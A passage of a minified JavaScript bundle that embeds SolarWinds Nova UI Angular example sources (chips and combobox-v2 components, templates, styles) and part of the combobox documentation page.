FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\nimport _pull from "lodash/pull";\n\nimport { IChipsGroup, IChipsItem, IChipsItemsSource } from "@nova-ui/bits";\n\nconst groupedItems: IChipsGroup[] = [\n    {\n        id: "statusGroupId",\n        label: "Status",\n        items: [\n            { id: "statusGroupItem1", label: "Down" },\n            { id: "statusGroupItem2", label: "Critical" },\n            { id: "statusGroupItem3", label: "Warning" },\n            { id: "statusGroupItem4", label: "Unknown" },\n            { id: "statusGroupItem5", label: "Ok" },\n        ],\n    },\n    {\n        id: "vendorGroupId",\n        label: "Vendor",\n        items: [\n            { id: "vendorGroupItem1", label: "Cisco" },\n            { id: "vendorGroupItem2", label: "Hewlett Packard" },\n            { id: "vendorGroupItem3", label: "Uniper" },\n        ],\n    },\n];\n\n@Component({\n    selector: "nui-vertical-grouped-chips-example",\n    templateUrl: "vertical-grouped-chips.example.component.html",\n})\nexport class VerticalGroupedChipsExampleComponent {\n    public verticalGroupedItemsSource: IChipsItemsSource = {\n        groupedItems: _cloneDeep(groupedItems),\n    };\n\n    public onClear(event: { item: IChipsItem; group?: IChipsGroup }): void {\n        console.log(\n            `\'onClear\' event fired. $event.item.id=${event.item.id} $event.group.id=${event.group?.id}`\n        );\n        _pull(event.group?.items || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.verticalGroupedItemsSource.groupedItems = [];\n    }\n}\n'},20561:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2 placeholder="Select Item" i18n-placeholder>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-combobox-v2>\n'},79037:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-v2-basic-example",\n    templateUrl: "combobox-v2-basic.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2BasicExampleComponent {\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n}\n'},49969:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    [placeholder]="combobox.selectedOptions.length ? \'\' : \'Select Items\'"\n    [formControl]="comboboxControl"\n    [multiselect]="true"\n    #combobox\n>\n    <ng-container selectedItems>\n        <nui-chip\n            nuiMarkAsSelectedItem\n            class="ml-2"\n            *ngFor="let item of combobox?.value"\n            closeButtonTooltip="Remove"\n            [item]="convertToChip(item)"\n            (remove)="combobox.deselectItem(item)"\n            (mouseup)="$event.stopPropagation()"\n        >\n        </nui-chip>\n    </ng-container>\n\n    <nui-select-v2-option\n        *ngFor="let option of options"\n        [value]="option"\n        class="d-flex align-items-center"\n    >\n        <span [nuiComboboxV2OptionHighlight]="option"></span>\n    </nui-select-v2-option>\n\n    <nui-overlay-item\n        *ngIf="combobox.canCreateOption | async"\n        class="nui-combobox-v2__create-option"\n        (click)="createOption(combobox.inputValue)"\n    >\n        Create option "{{ combobox.inputValue }}"\n    </nui-overlay-item>\n    <div\n        *ngIf="combobox.searchEmpty | async"\n        class="nui-combobox-v2__empty-search"\n        i18n\n    >\n        No other existing item available\n    </div>\n</nui-combobox-v2>\n'},59517:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference)\n    "../../../../../../src/styles/components/combobox-v2-addons.less";\n\n:host {\n    nui-chip {\n        display: inline-flex;\n        cursor: pointer;\n        margin-bottom: 5px;\n        border-radius: 9px;\n    }\n\n    .active {\n        .active-item();\n    }\n}\n'},25885:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    ChangeDetectionStrategy,\n    Component,\n    SecurityContext,\n} from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { DomSanitizer } from "@angular/platform-browser";\n\n@Component({\n    selector: "nui-combobox-v2-create-option-multiselect-example",\n    templateUrl: "combobox-v2-create-option-multiselect.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    styleUrls: ["combobox-v2-create-option-multiselect.example.component.less"],\n})\nexport class ComboboxV2CreateOptionMultiselectExampleComponent {\n    public options = Array.from({ length: 3 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n\n    public comboboxControl = new FormControl<string[] | null>(null);\n\n    constructor(private domSanitizer: DomSanitizer) {}\n\n    public createOption(optionName: string): void {\n        const sanitizedOption = this.domSanitizer\n            .sanitize(SecurityContext.HTML, optionName)\n            ?.trim();\n        if (sanitizedOption) {\n            this.options.push(sanitizedOption);\n            this.comboboxControl.setValue([\n                ...(this.comboboxControl.value || []),\n                optionName,\n            ]);\n        }\n    }\n\n    public convertToChip(value: string): { label: string } {\n        return { label: value };\n    }\n}\n'},80969:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let option of options" [value]="option">\n        <div class="d-flex align-items-center">\n            <span [nuiComboboxV2OptionHighlight]="option"></span>\n        </div>\n    </nui-select-v2-option>\n\n    <nui-overlay-item\n        *ngIf="combobox.canCreateOption | async"\n        class="nui-combobox-v2__create-option"\n        (click)="createOption(combobox.inputValue)"\n    >\n        Create option "{{ combobox.inputValue }}"\n    </nui-overlay-item>\n\n    <div\n        *ngIf="combobox.searchEmpty | async"\n        class="nui-combobox-v2__empty-search"\n        i18n\n    >\n        No other existing item available\n    </div>\n</nui-combobox-v2>\n'},67781:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    ChangeDetectionStrategy,\n    Component,\n    SecurityContext,\n    ViewChild,\n} from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { DomSanitizer } from "@angular/platform-browser";\n\nimport { ComboboxV2Component } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-v2-create-option-example",\n    templateUrl: "combobox-v2-create-option.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class ComboboxV2CreateOptionExampleComponent {\n    public options = Array.from({ length: 3 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    @ViewChild("combobox") public combobox: ComboboxV2Component;\n\n    public comboboxControl = new FormControl<string | null>(null);\n\n    constructor(private domSanitizer: DomSanitizer) {}\n\n    public createOption(option: string): void {\n        const sanitizedOption = this.domSanitizer\n            .sanitize(SecurityContext.HTML, option)\n            ?.trim();\n        if (sanitizedOption) {\n            this.options.push(sanitizedOption);\n            this.comboboxControl.setValue(sanitizedOption);\n        }\n    }\n}\n'},64335:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    [placeholder]="combobox.selectedOptions.length ? \'\' : placeholder"\n    [formControl]="comboboxControl"\n    [isTypeaheadEnabled]="true"\n    [multiselect]="true"\n    [manualDropdownControl]="true"\n    #combobox\n>\n    <ng-container selectedItems>\n        <nui-chip\n            nuiMarkAsSelectedItem\n            class="ml-2"\n            *ngFor="let option of combobox?.value"\n            closeButtonTooltip="Remove"\n            [item]="convertToChip(option)"\n            (remove)="onChipRemoved(option)"\n        >\n        </nui-chip>\n    </ng-container>\n\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <div class="d-flex align-items-center">\n            <span [nuiComboboxV2OptionHighlight]="item"></span>\n        </div>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n\n<div class="ml-4 d-flex w-75">\n    <button\n        #show\n        nui-button\n        type="button"\n        class="mr-3"\n        (click)="showList($event)"\n    >\n        Show\n    </button>\n\n    <button\n        #hide\n        nui-button\n        type="button"\n        class="mr-3"\n        (click)="hideList($event)"\n    >\n        Hide\n    </button>\n\n    <button\n        #toggle\n        nui-button\n        type="button"\n        class="mr-3"\n        (click)="toggleList($event)"\n    >\n        Toggle\n    </button>\n\n    <div class="d-flex align-items-center">\n        <nui-switch [(value)]="handleClicksOutside" i18n>\n            Close on focus-out\n        </nui-switch>\n    </div>\n</div>\n'},19803:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference)\n    "../../../../../../src/styles/components/combobox-v2-addons.less";\n\n.active {\n    .active-item();\n}\n\nnui-chip {\n    display: inline-flex;\n    cursor: pointer;\n    border-radius: 9px;\n    margin-bottom: 5px;\n}\n'},52599:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, OnDestroy, ViewChild } from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { Subject } from "rxjs";\n\nimport { ComboboxV2Component } from "@nova-ui/bits";\n\ninterface IExampleItem {\n    id: string;\n    name: string;\n}\n\n@Component({\n    selector: "nui-combobox-v2-custom-control-example",\n    templateUrl: "combobox-v2-custom-control.example.component.html",\n    styleUrls: ["combobox-v2-custom-control.example.component.less"],\n    host: { class: "combobox-container d-flex" },\n})\nexport class ComboboxV2CustomControlExampleComponent\n    implements OnDestroy, AfterViewInit\n{\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxControl = new FormControl<string | null>(null);\n    public placeholder: string = $localize`Select Item`;\n    public handleClicksOutside: boolean = false;\n\n    @ViewChild("combobox") public combobox: ComboboxV2Component;\n\n    private readonly destroy$ = new Subject<void>();\n\n    public ngAfterViewInit(): void {\n        this.combobox.clickOutsideDropdown.subscribe(() => {\n            if (this.handleClicksOutside) {\n                this.combobox.hideDropdown();\n            }\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n\n    public onChipRemoved(item: IExampleItem): void {\n        this.combobox.deselectItem(item);\n    }\n\n    public convertToChip(value: IExampleItem): { label: IExampleItem } {\n        return { label: value };\n    }\n\n    public showList(event: Event): void {\n        event.stopPropagation();\n        this.combobox.showDropdown();\n        this.combobox.inputElement.nativeElement.focus();\n    }\n\n    public hideList(event: Event): void {\n        event.stopPropagation();\n        this.combobox.hideDropdown();\n    }\n\n    public toggleList(event: Event): void {\n        event.stopPropagation();\n        this.combobox.toggleDropdown();\n        this.combobox.inputElement.nativeElement.focus();\n    }\n}\n'},4835:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    [displayWith]="displayFn"\n    [isTypeaheadEnabled]="false"\n    (valueChanged)="onValueChange($event)"\n    #combobox\n>\n    <nui-select-v2-option\n        *ngFor="let item of filteredItems$ | async"\n        [value]="item"\n    >\n        <span [nuiComboboxV2OptionHighlight]="item.name"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n'},46171:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { Subject } from "rxjs";\n\ninterface IExampleItem {\n    id: string;\n    name: string;\n}\n\n@Component({\n    selector: "nui-combobox-v2-custom-typeahead-example",\n    templateUrl: "combobox-v2-custom-typeahead.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2CustomTypeaheadExampleComponent {\n    public items: IExampleItem[] = Array.from({ length: 100 }).map((_, i) => ({\n        id: `value-${i}`,\n        name: $localize`Item ${i}`,\n    }));\n\n    public comboboxControl = new FormControl<string | null>(null);\n\n    // Use this in the template with async pipe to dynamically render the filtered items\n    public filteredItems$: Subject<any[]> = new Subject<any[]>();\n\n    public onValueChange(value: any): void {\n        // Please be aware that there is a known issue (NUI-6131) which results in the\n        // entire set of items appearing in the filtering results on input value set and change\n\n        // Once the combobox input changes the new value is emitted.\n        // Use this value to filter out the array of items\n        value\n            ? this.filteredItems$.next(this.filterItems(String(value)))\n            : this.filteredItems$.next(this.items.slice());\n    }\n\n    public displayFn(item: IExampleItem): string {\n        return item?.name || "";\n    }\n\n    // For the sake of the example, the filtering is quite simple.\n    // It filters out the combobox items depending on the user input.\n    private filterItems(value: string): IExampleItem[] {\n        const filterValue = value.toLowerCase();\n\n        return this.items.filter((option) =>\n            option.name.toLowerCase().includes(filterValue)\n        );\n    }\n}\n'},75765:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    [displayWith]="displayFn"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span class="mr-3" [nuiComboboxV2OptionHighlight]="item.name"></span>\n        <nui-icon [icon]="item.icon"></nui-icon>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n'},30001:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\ninterface IExampleItem {\n    id: string;\n    name: string;\n    icon: string;\n}\n\n@Component({\n    selector: "nui-combobox-v2-customize-options-example",\n    templateUrl: "combobox-v2-customize-options.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2CustomizeOptionsExampleComponent {\n    public icons: any[] = ["check", "email", "execute"];\n    public items: IExampleItem[] = Array.from({ length: 100 }).map((_, i) => ({\n        id: `value-${i}`,\n        name: $localize`Item ${i}`,\n        icon: this.getRandomIcon(),\n    }));\n\n    public comboboxControl = new FormControl<string | null>(null);\n\n    public displayFn(item: IExampleItem): string {\n        return item?.name || "";\n    }\n\n    private getRandomIcon() {\n        return this.icons[Math.round(Math.random() * 2)];\n    }\n}\n'},46561:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    [isDisabled]="isComboboxDisabled"\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    [displayWith]="displayFn"\n    class="w-50 d-inline-flex"\n    #combobox\n>\n    <nui-select-v2-option\n        *ngFor="let item of items"\n        [value]="item"\n        [isDisabled]="item.disabled"\n    >\n        <span class="mr-3" [nuiComboboxV2OptionHighlight]="item.name"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n\n<nui-switch\n    class="d-inline-flex"\n    style="padding-left: 15px"\n    [(value)]="isComboboxDisabled"\n    i18n\n>\n    Toggle disabling\n</nui-switch>\n'},7693:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\ninterface IExampleItem {\n    id: string;\n    name: string;\n    disabled: boolean;\n}\n\n@Component({\n    selector: "nui-combobox-v2-disabled-example",\n    templateUrl: "combobox-v2-disabled.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2DisabledExampleComponent {\n    public items: IExampleItem[] = Array.from({ length: 100 }).map((_, i) => ({\n        id: `value-${i}`,\n        name: $localize`Item ${i}`,\n        disabled: Boolean(Math.round(Math.random())),\n    }));\n    public comboboxControl = new FormControl<string | null>(null);\n    public isComboboxDisabled = false;\n\n    public displayFn(item: IExampleItem): string {\n        return item?.name || "";\n    }\n}\n'},31059:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The <code>&lt;nui-combobox-v2&gt;</code> component allows users to select\n    item(s) from a list.\n</p>\n<p>\n    Combobox works best when the options list is big enough and you need to\n    filter it using typeahead. In case your list contains few items or you need\n    to use custom input, consider using\n    <a href="../components/SelectV2Component.html" target="_blank"\n        >Select Component</a\n    >\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiSelectV2Module</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To use <code>&lt;nui-combobox-v2&gt;</code>, wrap each of the options within\n    a <code>&lt;select-v2-option&gt;</code> instance.\n    <code>&lt;select-v2-option&gt;</code> has the <code>value</code> input so\n    that it\'s <strong>unique</strong> for each option.\n</p>\n\n<p>\n    You can use a <code>string</code> or an <code>object</code> as a\n    <code>value</code>. In some cases, e.g. if using <em>Grouped items</em>,\n    it\'s recommended to use <code>object</code> and provide some id\'s, because\n    you can have the same option title in the different groups and it\'s\n    necessary to distinguish them somehow. Also, using <code>string</code> may\n    cause <code>i18n</code> issues as far as the same value is used for model\n    and displaying on the view.\n</p>\n\n<p>\n    Wrap all of the options inside a\n    <code>&lt;nui-combobox-v2&gt;</code> instance as a content projection for\n    the dropdown.\n</p>\n\n<p>\n    You can put pretty much anything inside a\n    <code>&lt;nui-combobox-v2&gt;</code> dropdown. For example, if you need the\n    dropdown to display some info text, you can project\n    <em>standard HTML</em> into the dropdown and it will be shown as\n    <em>standard HTML</em> rather than a select option.\n</p>\n\n<p>\n    Highlighting of the searching string is the <b>default</b> functionality,\n    read more about it in the\n    <a (click)="scrollTo(typeahead)">Typeahead</a> section.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-combobox-v2-basic-example></nui-combobox-v2-basic-example>\n</nui-example-wrapper>\n\n<h2>Getting and setting the combobox value</h2>\n\n<h3>Getting a Value</h3>\n<p>You can use the following ways to get a value from a combobox component:</p>\n<ul>\n    <li>Access the <code>value</code> property on the component</li>\n    <li>\n        Bind to the <code>valueSelected</code> output - emits the selected value\n    </li>\n    <li>\n        Bind to the <code>valueChanged</code> output - emits after\n        <strong>input</strong> was changed\n    </li>\n</ul>\n\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-getting-value"\n    exampleTitle="Getting Value"\n>\n    <nui-combobox-v2-getting-value-example></nui-combobox-v2-getting-value-example>\n</nui-example-wrapper>\n\n<h3>Setting a Value</h3>\n<p>\n    To set a value for a combobox, you can use either the\n    <code>value</code> input or the reactive form control\n    <code\n        ><a\n            href="https://angular.io/guide/reactive-forms#replacing-a-form-control-value"\n            target="_blank"\n            >setValue</a\n        ></code\n    >\n    method, to provide an option from the list.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-setting-value"\n    exampleTitle="Setting Value"\n>\n    <nui-combobox-v2-setting-value-example></nui-combobox-v2-setting-value-example>\n</nui-example-wrapper>\n\n<h2 #typeahead>Typeahead</h2>\n<p>\n    <code>&lt;nui-combobox-v2&gt;</code> comes with built-in typeahead\n    functionality so you can filter options in the list.\n</p>\n<p>\n    To enable highlighting of the search string within the combobox options, you\n    can use the default highlighting functionality provided by the\n    <code>nuiComboboxV2OptionHighlight</code>\n    directive:\n</p>\n<p>\n    <code>&lt;span [nuiComboboxV2OptionHighlight]="item"&gt;&lt;span&gt;</code>\n</p>\n<p>\n    For more detail on how to get this working, take a look at the code inside\n    the source expander of the\n    <strong>Basic Usage</strong> example above.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> If you want more customization, you can implement\n    custom highlighting via the\n    <a href="../pipes/HighlightPipe.html" target="_blank"\n        ><code>HighlightPipe</code></a\n    >\n    instead of <code>nuiComboboxV2OptionHighlight</code>.\n</nui-message>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> You can disable or use custom\n    <em>typeahead</em> behavior if the default behavior doesn\'t meet your\n    requirements. For that, please see the <strong>Custom Typeahead</strong>\n    section. As always, before implementing a custom behavior, it\'s important to\n    consult with UX leadership. This will ensure that the desired behavior\n    conforms to the Nova Design Language.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-typeahead"\n    exampleTitle="Typeahead"\n>\n    <nui-combobox-v2-typeahead-example></nui-combobox-v2-typeahead-example>\n</nui-example-wrapper>\n\n<h2>Options Customization</h2>\n<p>\n    It\'s possible to use a custom template for the <code>option</code>s in the\n    list. You can use pretty much any layout for the options by putting the\n    template inside a <code>&lt;select-v2-option&gt;</code> instance.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-customize-options"\n    exampleTitle="Options Customization"\n>\n    <nui-combobox-v2-customize-options-example></nui-combobox-v2-customize-options-example>\n</nui-example-wrapper>\n\n<h2>Grouped Options</h2>\n<p>\n    If you want to group options you can wrap them in a\n    <code>&lt;nui-select-v2-option-group&gt;</code>\n    instance. You can also provide a header for a group (optionally).\n</p>\n<p>\n    To use default styles for a header (as in the example below), apply\n    <code>.nui-select-v2-option-group--header</code> class to the header.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> Technically you can use any template instead of, or\n    in addition to, the header.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-grouped-options"\n    exampleTitle="Grouped Options Usage"\n>\n    <nui-combobox-v2-grouped-options-example></nui-combobox-v2-grouped-options-example>\n</nui-example-wrapper>\n\n<h2 #reactiveForms>Using With Reactive Forms</h2>\n<p>\n    To use <code>nui-combobox-v2</code> with reactive forms, create a\n    <code>FormControl</code> that represents the form model. Then, bind\n    <code>nui-combobox-v2</code> to this form element.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> It\'s recommended to use the\n    <code\n        ><a href="../components/FormFieldComponent.html" target="_blank"\n            >&lt;nui-form-field&gt;</a\n        ></code\n    >\n    component as a wrapper if you are going to use validation, captions, labels,\n    etc.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-reactive-form-field"\n    exampleTitle="Reactive Form Field"\n>\n    